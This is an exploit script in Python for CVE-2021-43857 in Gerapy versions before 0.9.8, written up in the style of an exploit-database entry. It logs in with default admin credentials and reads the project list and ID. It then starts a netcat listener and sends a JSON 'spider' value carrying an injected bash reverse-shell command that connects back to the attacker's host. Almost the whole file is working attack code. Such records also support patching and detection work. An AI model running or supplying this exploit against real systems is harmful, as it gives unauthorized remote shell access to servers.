# Exploit Title: Gerapy 0.9.7 - Remote Code Execution (RCE) (Authenticated)
# Date: 03/01/2022
# Exploit Author: Jeremiasz Pluta
# Vendor Homepage: https://github.com/Gerapy/Gerapy
# Version: All versions of Gerapy prior to 0.9.8
# CVE: CVE-2021-43857
# Tested on: Gerapy 0.9.6

# Vulnerability: Gerapy prior to version 0.9.8 is vulnerable to remote code execution. This issue is patched in version 0.9.8.

#!/usr/bin/python
import sys
import re
import argparse
import pyfiglet
import requests
import time
import json
import subprocess

banner = pyfiglet.figlet_format("CVE-2021-43857")
print(banner)
print('Exploit for CVE-2021-43857')
print('For: Gerapy < 0.9.8')

login = "admin" #CHANGE ME IF NEEDED
password = "admin" #CHANGE ME IF NEEDED

class Exploit:

	def __init__(self, target_ip, target_port, localhost, localport):
		self.target_ip = target_ip
		self.target_port = target_port
		self.localhost = localhost
		self.localport = localport

	def exploitation(self):
		payload = """{"spider":"`/bin/bash -c 'bash -i >& /dev/tcp/""" + localhost + """/""" + localport + """ 0>&1'`"}"""

		#Login to the app (getting auth token)
		url = "http://" + target_ip + ":" + target_port
		r = requests.Session()
		print("[*] Resolving URL...")
		r1 = r.get(url)
		time.sleep(3)
		print("[*] Logging in to application...")
		r2 = r.post(url + "/api/user/auth", json={"username":login,"password":password}, allow_redirects=True)
		time.sleep(3)
		if (r2.status_code == 200):
			print('[*] Login successful! Proceeding...')
		else:
			print('[*] Something went wrong!')
			quit()

		#Create a header out of auth token (yep, it's bad as it looks)
		dict = json.loads(r2.text)
		temp_token = 'Token '
		temp_token2 = json.dumps(dict['token']).strip('"')
		auth_token = {}
		auth_token['Authorization'] = temp_token + temp_token2

		#Get the project list
		print("[*] Getting the project list")
		r3 = r.get(url + "/api/project/index", headers=auth_token, allow_redirects=True)
		time.sleep(3)

		if (r3.status_code != 200):
			print("[!] Something went wrong! Maybe the token is corrupted?")
			quit();

		#Parse the project name for a request (yep, it's worse than earlier)
		dict = r3.text # [{'name': 'test'}]
		dict2 = json.dumps(dict)
		dict3 = json.loads(dict2)
		dict3 = json.loads(dict3)
		name = dict3[0]['name']
		print("[*] Found project: " + name)

		#use the id to check the project
		print("[*] Getting the ID of the project to build the URL")
		r4 = r.get(url + "/api/project/" + name + "/build", headers=auth_token, allow_redirects=True)
		time.sleep(3)
		if (r4.status_code != 200):
			print("[*] Something went wrong! I can't reach the found project!")
			quit();

		#format the json to dict
		dict = r4.text
		dict2 = json.dumps(dict)
		dict3 = json.loads(dict2)
		dict3 = json.loads(dict3)
		id = dict3['id']
		print("[*] Found ID of the project: ", id)
		time.sleep(1)

		#netcat listener
		print("[*] Setting up a netcat listener")
		listener = subprocess.Popen(["nc", "-nvlp", self.localport])
		time.sleep(3)

		#exec the payload
		print("[*] Executing reverse shell payload")
		print("[*] Watchout for shell! :)")
		r5 = r.post(url + "/api/project/" + str(id) + "/parse", data=payload, headers=auth_token, allow_redirects=True)
		listener.wait()

		if (r5.status_code == 200):
			print("[*] It worked!")
			listener.wait()
		else:
			print("[!] Something went wrong!")
			listener.terminate()

def get_args():
	parser = argparse.ArgumentParser(description='Gerapy < 0.9.8 - Remote Code Execution (RCE) (Authenticated)')
	parser.add_argument('-t', '--target', dest="url", required=True, action='store', help='Target IP')
	parser.add_argument('-p', '--port', dest="target_port", required=True, action='store', help='Target port')
	parser.add_argument('-L', '--lh', dest="localhost", required=True, action='store', help='Listening IP')
	parser.add_argument('-P', '--lp', dest="localport", required=True, action='store', help='Listening port')
	args = parser.parse_args()
	return args

args = get_args()
target_ip = args.url
target_port = args.target_port
localhost = args.localhost
localport = args.localport

exp = Exploit(target_ip, target_port, localhost, localport)
exp.exploitation()